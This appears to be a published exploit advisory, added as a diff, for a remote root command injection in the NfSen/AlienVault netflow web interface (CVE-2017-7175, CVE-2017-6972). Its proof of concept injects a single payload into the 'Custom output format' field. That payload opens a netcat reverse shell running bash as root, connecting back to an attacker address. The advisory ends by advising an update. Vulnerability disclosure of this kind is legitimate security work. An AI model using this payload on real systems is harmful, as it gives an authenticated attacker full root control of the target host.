@@ -1,0 +1,28 @@
+# Exploit Title: NfSen/AlienVault remote root exploit (command injection in customfmt parameter)
+# Version: NfSen 1.3.6p1, 1.3.7 and 1.3.7-1~bpo80+1_all. Previous versions are also likely to be affected.
+# Version: AlienVault USM/OSSIM < 4.3.1
+# Date: 2017-07-10
+# Vendor Homepage: http://nfsen.sourceforge.net/
+# Vendor Homepage: http://www.alienvault.com/
+# Software Link: https://sourceforge.net/projects/nfsen/files/stable/nfsen-1.3.7/nfsen-1.3.7.tar.gz/download
+# Exploit Author: Paul Taylor / Foregenix Ltd
+# Website: http://www.foregenix.com/blog
+# Tested on: NfSen 1.3.7
+# CVE: CVE-2017-7175, CVE-2017-6972
+
+1. Description
+
+A remote authenticated attacker (or an attacker with a stolen PHP Session ID) can gain complete control over the system by sending a crafted request with shell commands which will be executed as root on a vulnerable system. The injection is covered by CVE-2017-7175, and the commands are executed as root due to CVE-2017-6972.
+
+2. Proof of Concept
+
+
+For a reverse shell to attacking machine 10.100.1.2, on the NfSen / AlienVault netflow processing web page, enter the following into the "Custom output format:" input box:
+
+'; nc -ne /bin/bash 10.100.1.2 443 #
+
+If nc is not installed on the target, then alternative attacks are likely to be possible to leverage the vulnerability.
+
+3. Solution:
+
+Update to latest version of NfSen/USM/OSSIM
